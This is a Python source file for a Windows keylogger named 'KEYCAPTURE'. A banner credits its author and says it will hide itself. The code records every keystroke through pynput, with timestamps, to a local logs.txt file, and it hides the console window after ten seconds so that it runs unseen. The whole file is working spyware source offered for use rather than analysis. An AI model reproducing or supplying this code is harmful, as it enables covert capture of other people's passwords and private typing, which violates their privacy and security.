try:	
	from pynput import keyboard
	import os, sys, win32gui, win32console, datetime, time
except:
    print("Please Install modules named Pynput, win32")
	
if os.path.exists("logs.txt") == False:
        file = open("logs.txt", "w")
        file.close()

print('''
    |----->         KEYCAPTURE KEYLOGGER\n                     
    |----->          MADE BY KULDIP <3                       
    |----->           IN PYTHON 3 \n                        
    |----->Pretty! Simple and basic  keylogger for windows.\n
    |----->             Thanks to:-					   
    |-----> YOUTUBE, THE LEGEND GOOGLE, ALL MY FRIENDS.	   
    |----->         sorry if i forgot someone.		       
    |----->    These helps to make this thing happen. ;)

	
	
NOTE:- Logs.txt file will be saved in same directory where the script is.
				
WINDOW IS HIDDING IN 10 SECONDS. TO END THE PROGRAM
		    OPEN TASK MANAGER AND KILL
		     PROCESS NAME "PYTHON"
							   
		HANKYOU FOR USING ME.
	''')
time.sleep(10)

def hide():
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)
    
hide()

def on_press(key):
        global file
        time = datetime.datetime.now()
        with open("logs.txt", "a") as file:

            if key == keyboard.Key.enter:
                file.write("\n"+str(time)+"\n")

            elif key == keyboard.Key.space:
                file.write(" ")

            elif key == keyboard.Key.backspace:
                file.write(" [BACKSPACE] ")

            elif key == keyboard.Key.esc:
                file.write(" [ESC] ")

            elif key == keyboard.Key.alt_gr:
                file.write(" [ALT GR] ")
            
            elif key == keyboard.Key.alt_l:
                file.write(" [ALT L] ")

            elif key == keyboard.Key.alt_r:
                file.write(" [ALT R] ")

            elif key == keyboard.Key.caps_lock:
                file.write(" [CAPS LOCK] ")

            elif key == keyboard.Key.cmd:
                file.write(" [CMD/WINDOWS R] ")
            
            elif key == keyboard.Key.ctrl_r:
                file.write(" [CTRL R] ")

            elif key == keyboard.Key.ctrl_l:
                file.write(" [CTRL L] ")

            elif key == keyboard.Key.delete:
                file.write(" [DELETE] ")

            elif key == keyboard.Key.down:
                file.write(" [DOWN] ")

            elif key == keyboard.Key.up:
                file.write(" [UP] ")

            elif key == keyboard.Key.down:
                file.write(" [DOWN] ")
            
            elif key == keyboard.Key.left:
                file.write(" [LEFT] ")

            elif key == keyboard.Key.right:
                file.write(" [RIGHT] ")

            elif key == keyboard.Key.home:
                file.write(" [HOME] ")

            elif key == keyboard.Key.insert:
                file.write(" [INSERT] ")

            elif key == keyboard.Key.menu:
                file.write(" [MENU] ")

            elif key == keyboard.Key.num_lock:
                file.write(" [NUM_LOCK] ")

            elif key == keyboard.Key.page_down:
                file.write(" [PAGE DOWN] ")

            elif key == keyboard.Key.page_up:
                file.write(" [PAGE UP] ")

            elif key == keyboard.Key.pause:
                file.write(" [PAUSE] ")

            elif key == keyboard.Key.print_screen:
                file.write(" [PRINT SCREEN] ")

            elif key == keyboard.Key.scroll_lock:
                file.write(" [SCROLL LOCK] ")

            elif key == keyboard.Key.shift_r:
                file.write(" [SHIFT R] ")

            elif key == keyboard.Key.shift_l:
                file.write(" [SHIFT L] ")

            elif key == keyboard.Key.tab:
                file.write(" [TAB] ")

            elif key == keyboard.Key.end:
                file.write(" [END] ")

            elif key == keyboard.Key.f1:
                file.write(" [F1] ")

            elif key == keyboard.Key.f2:
                file.write(" [F2] ")

            elif key == keyboard.Key.f3:
                file.write(" [F3] ")

            elif key == keyboard.Key.f4:
                file.write(" [F4] ")

            elif key == keyboard.Key.f5:
                file.write(" [F5] ")

            elif key == keyboard.Key.f6:
                file.write(" [F6] ")

            elif key == keyboard.Key.f7:
                file.write(" [F7] ")

            elif key == keyboard.Key.f8:
                file.write(" [F8] ")

            elif key == keyboard.Key.f9:
                file.write(" [F9] ")

            elif key == keyboard.Key.f10:
                file.write(" [F10] ")
    
            elif key == keyboard.Key.f11:
                file.write(" [F11] ")

            elif key == keyboard.Key.f12:
                file.write(" [F12] ")

            else:
                logs = str(key)
                file.write(logs[1])
	



with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


